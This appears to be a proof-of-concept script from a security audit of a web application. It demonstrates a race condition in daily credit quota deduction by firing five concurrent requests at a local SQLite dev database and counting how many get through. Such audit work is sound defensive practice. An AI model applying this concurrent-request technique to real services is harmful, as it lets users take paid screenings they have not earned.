/**
 * PoC 4: DAILY QUOTA RACE CONDITION — TOCTOU in Credit Deduction
 * Severity: MEDIUM
 * 
 * Finding: In src/app/api/upload/route.ts, the flow is:
 *   1. canUserScreen(userId) — reads quota OUTSIDE transaction
 *   2. deductCredit(userId, candidateId) — reads quota AGAIN inside transaction
 * 
 * While deductCredit uses a transaction, the condition check inside the
 * transaction uses a stale read value (read at start, check, then increment).
 * Two concurrent requests can both pass the check.
 * 
 * Run: npx tsx .tmp-poc/poc4-quota-race-condition.ts
 */

import { PrismaClient } from '../src/generated/prisma/client';
import { PrismaBetterSqlite3 } from '@prisma/adapter-better-sqlite3';
import { DAILY_QUOTA_LIMIT } from '../src/lib/credits';

const adapter = new PrismaBetterSqlite3({ url: 'file:./dev.db' });
const prisma = new PrismaClient({ adapter });

const WIB_TIMEZONE = 'Asia/Jakarta';

function getCurrentDateWIB(): string {
  const now = new Date();
  return new Intl.DateTimeFormat('en-CA', {
    timeZone: WIB_TIMEZONE,
  }).format(now);
}

async function poc() {
  console.log('=== PoC 4: Daily Quota Race Condition ===\n');

  // Setup: create a test user with quotaUsed = DAILY_QUOTA_LIMIT - 1
  const testEmail = 'race-test@poc.test';
  const passwordHash = '$2a$12$LJ3m4ys3Lg.Ky8YXQXZzHOJz0VHqYxqCgK2yKXh3jD7vHgB1rP3yO';

  // Clean up any previous test user
  await prisma.user.deleteMany({ where: { email: testEmail } });

  const user = await prisma.user.create({
    data: {
      name: 'Race Test User',
      email: testEmail,
      passwordHash,
      creditBalance: 0,
      dailyQuotaUsed: DAILY_QUOTA_LIMIT - 1, // 4 out of 5 used
      lastQuotaDate: getCurrentDateWIB(),
    },
  });

  console.log(`Test user created: ${user.id}`);
  console.log(`Daily quota used: ${user.dailyQuotaUsed}/${DAILY_QUOTA_LIMIT}`);
  console.log(`Remaining quota: ${DAILY_QUOTA_LIMIT - user.dailyQuotaUsed}`);
  console.log(`Credit balance: ${user.creditBalance}\n`);

  // Simulate the deductCredit logic from credits.ts
  async function simulateDeductCredit(userId: string, requestId: string): Promise<{
    success: boolean;
    source: string;
    quotaAfter: number;
  }> {
    const today = getCurrentDateWIB();
    
    return prisma.$transaction(async (tx) => {
      const u = await tx.user.findUnique({
        where: { id: userId },
        select: { creditBalance: true, dailyQuotaUsed: true, lastQuotaDate: true },
      });

      if (!u) throw new Error('User not found');

      let dailyQuotaUsed = u.dailyQuotaUsed;

      if (u.lastQuotaDate !== today) {
        dailyQuotaUsed = 0;
        await tx.user.update({
          where: { id: userId },
          data: { dailyQuotaUsed: 0, lastQuotaDate: today },
        });
      }

      // THE VULNERABILITY: Check uses stale `dailyQuotaUsed` from the read above
      // The increment is atomic ({ increment: 1 }), but the CHECK is not
      if (dailyQuotaUsed < DAILY_QUOTA_LIMIT) {
        await tx.user.update({
          where: { id: userId },
          data: { dailyQuotaUsed: { increment: 1 } },
        });

        const updated = await tx.user.findUnique({
          where: { id: userId },
          select: { dailyQuotaUsed: true },
        });

        return {
          success: true,
          source: 'quota',
          quotaAfter: updated!.dailyQuotaUsed,
        };
      }

      return { success: false, source: 'none', quotaAfter: u.dailyQuotaUsed };
    });
  }

  // Launch concurrent requests
  console.log('Launching 5 concurrent deductCredit requests...');
  console.log('(Only 1 should succeed, but SQLite may allow more due to stale reads)\n');

  const CONCURRENT = 5;
  const promises = Array.from({ length: CONCURRENT }, (_, i) =>
    simulateDeductCredit(user.id, `req-${i}`)
      .then(r => ({ ...r, index: i }))
      .catch(e => ({ success: false, source: 'error', quotaAfter: -1, index: i, error: e.message }))
  );

  const results = await Promise.all(promises);

  console.log('--- Results ---');
  let successCount = 0;
  for (const r of results) {
    const status = r.success ? '✅ SUCCESS' : '❌ DENIED';
    console.log(`  Request ${r.index}: ${status} | quotaAfter: ${r.quotaAfter}`);
    if (r.success) successCount++;
  }

  const finalUser = await prisma.user.findUnique({
    where: { id: user.id },
    select: { dailyQuotaUsed: true },
  });

  console.log(`\n--- Summary ---`);
  console.log(`Requests launched: ${CONCURRENT}`);
  console.log(`Successful deductions: ${successCount}`);
  console.log(`Final dailyQuotaUsed: ${finalUser?.dailyQuotaUsed}`);
  console.log(`Quota limit: ${DAILY_QUOTA_LIMIT}`);

  if (successCount > 1) {
    console.log(`\n🔴 VULNERABILITY CONFIRMED: ${successCount} requests succeeded`);
    console.log(`   Expected: at most 1 success (quota was at ${DAILY_QUOTA_LIMIT - 1})`);
    console.log(`   User got ${successCount} free screenings instead of 1`);
  } else if (successCount === 1) {
    console.log(`\n🟡 Only 1 success — SQLite serialization prevented race condition.`);
    console.log(`   However, this protection is IMPLICIT (deadlock resolution).`);
    console.log(`   Under different DB config or connection pooling, race may occur.`);
  } else {
    console.log(`\n🟢 All requests denied — race condition not triggered.`);
  }

  // Cleanup
  await prisma.user.delete({ where: { id: user.id } });
  console.log('\nCleaned up test user.');

  await prisma.$disconnect();
}

poc().catch(console.error);
